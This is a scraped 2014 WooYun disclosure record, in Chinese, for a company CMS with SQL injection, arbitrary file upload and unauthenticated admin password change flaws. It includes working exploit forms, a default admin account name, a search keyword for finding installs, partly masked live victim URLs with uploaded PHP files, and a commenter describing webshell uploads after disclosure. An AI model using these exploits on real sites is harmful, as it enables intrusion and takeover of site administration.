{"id": 1882, "wybug_id": "wooyun-2014-062071", "wybug_title": "某建站公司开发的CMS存在通用SQL注射、任意文件上传、管理员密码修改漏洞", "wybug_corp": "某网络科技有限公司", "wybug_author": "U神", "wybug_date": "2014-05-25 11:27", "wybug_open_date": "2014-08-23 11:28", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "注射", "任意密码修改"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向公众公开  简要描述： @疯狗，这个危害大啊~多个漏洞打包了，求来个首页，今晚请你吃饭！ 详细说明：  #1.通用漏洞的详细描述\n1、建站程序类型：PHP+Mysql2、漏洞类型：大量SQL注入、任意文件上传、管理员密码修改3、缺陷文件：注入：news_show.php 等大量上传漏洞：admin_topsi/addpic.php?action=upload管理员密码修改：admin_topsi/modifypwd.php4、注入参数：id、tid等等5.涉及版本：全版本7、危害程度：高危8、涉及厂商：苏州托普斯网络科技有限公司9、厂商网站：http://www.topsi.net.cn/10、安装量：大11、是否拥有源代码分析：暂无12、关键字：\"技术支持：苏州托普斯网络\" 厂商案例：http://www.topsi.net.cn/case.php13、是否默认配置：是14、枚举案例【应乌云的要求，枚举5例】：【声明：以下提供的全部案例一方面证明通用型，一方面是给CNVD或Cncert测试，其他人不得用此作非法用途或者破坏操作，否则后果自负】http://www.h***o.co/http://www.c***n.comhttp://www.s***ng.comhttp://www.k***.gov.cnhttp://hefeng.***61.comhttp://www.m***ie.com.cn.....等等\n#2.关键字的搜索量、厂商主页的案例列表：\n\n\n\n\n\n\n\n   漏洞证明：  #3.SQL注入漏洞的实例证明（乌云要求枚举5枚）：\nhttp://www.***.com/product_show.php?id=31\n\nhttp://www.***.com/news_show.php?id=36&tid=2&cid=2\n\n\n\nhttp://www.s***ao.com/news_show.php?id=29\n\n\n\nhttp://www.k***f.net/new_show.php?id=61\n\n\n\nhttp://www.s***.com/news_show.php?id=48\n\n\n\n\n************************************************************************************************#4.任意文件上传证明【admin_topsi/addpic.php】：首先要知道默认后台是：admin_topsi/login.php默认后台页面样式：\n\n详细说明：后台的文件上传页面【admin_topsi/addpic.php】虽然限制了访问该页面，但是通过测试，本地构造上传表单直接post到这个地址，NC提交post数据包或者开启抓包工具就可以得到上传的文件。EXP：\n<form enctype=\"multipart/form-data\" method=\"post\" action=\"http://xxxx.com/admin_topsi/addpic.php?action=upload\"><input name=\"mypic\" type=\"File\" size=\"35\"><input type=\"Submit\" name=\"Submit\" value=\"upload\"></form>\n然后提交之后抓包，获得上传文件，统一存储在【upload】目录下：\n\n\nhttp://www.s***ic.com/upload/1400849095.php\n\n\n继续枚举案例：\n\n\nhttp://www.k***china.com/upload/1400849551.php\n\n\n再继续枚举案例:\n\n\nhttp://www.c***ter.com/upload/1400849984.php\n\n\n最后再努力举例一枚：\n\n\nhttp://www.***ck.com/upload/1400850100.php\n\n\n************************************************************************************************#5.管理员密码修改证明【admin_topsi/modifypwd.php】首先说明一下，这套CMS存在通用帐号：“admintopsi”，跟上面原理一样，直接提交就可以了，虽然会跳转到登录框，但是无视它直接用新密码登录会发现成功登录，下面构造EXP：\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\"><title>ModifyAdminpwd</title></head><body><form method=\"post\" action=\"http://www.xxxx.com/admin_topsi/modifypwd.php\" name=\"form1\">     用 户 名：<b>admintopsi</b>\t  <br>      新 密 码：      <input name=\"password\" type=\"password\" id=\"password\">\t  <br>     确认密码：      <input name=\"pwdconfirm\" type=\"password\" id=\"pwdconfirm\"> \t  <br>      <input class=\"luweiinput\" type=\"submit\" name=\"Submit\" value=\" 确 定 \">\t  <input class=\"luweiinput\" name=\"Cancel\" type=\"button\" id=\"Cancel\" value=\" 取 消 \"></form>\n大神一眼看出这个EXP有问题吧，我也暂时没有分析出用户名是怎么接收的？源码没权限拿到啊~所以这里只能改默认帐号“admintopsi”，但是绝大多存在该默认帐号~实战测试：\nhttp://www.k***n.com/\n根据注入发现这个网站存在默认帐号：admintopsi然后直接上EXP去修改，修改成功~\n\n再来一例~(仔细看，虽然会跳转到登录框)\nhttp://www.s***z.com\n\n\n\n\n最后再演示一例：\nhttp://www.s***bao.com\n\n\nPS:有人会说，你这肯定是登录后台留下了缓存或cookie导致可以修改密码的，首先我要这样说，测试这个漏洞的时候我并没有去尝试登录后台，而是先通过注入得到帐号密码，然后将密码解密，这里解密是因为我既然改了别人密码肯定要改回去是吧，不然别人很着急的，所以我先记下原密码，然后我连后台都没登录过，然后通过上面给出的EXP，直接将密码修改成123456或其它密码，结果发现确实是可以登录的，也就是说无需进入后台就可以修改密码。我所奇怪之处就是不知道这个用户名是如何接收的，测试了一下用增加一个input里面的id改为username、name都无效，通过抓包也没分析出来~而且这些网站真奇怪！   修复方案：  PS：希望cncert在测试修改密码这个漏洞的时候先通过注射将原密码注射出来解密后，记住原密码，然后再尝试测试修改密码这个漏洞！以免给他人带来不必要的麻烦，谢谢合作~【以上均为安全测试，漏洞报告，其他人请勿用于非法用途或破坏，否则后果自负】   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-30 09:49 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向软件生产厂商通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-25 12:07 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  三合一啊，今晚可以到警局来吃饭    \n     2014-05-25 12:31 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @疯狗 我擦！你这样打出厂商名字来不就谁都知道详情了？    \n     2014-05-25 12:48 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  @U神 +1 这样子基本上都知道了。    \n     2014-05-26 11:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @U神 - - ！    \n     2014-05-26 11:47 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @U神 @疯狗 吃饭了？    \n     2014-08-24 22:05 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  目测 任意上传用不了呢 。。我传了过后 跳出的是404。。。。。X    \n     2014-08-24 22:57 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @answer 厂商已经修复了漏洞    \n     2014-08-24 23:39 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  @U神 霍霍 虽然修了 但还是找到有漏网之鱼，，但不知道为什么传上去的马儿访问的时候有错误。。不知道怎么回事 。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}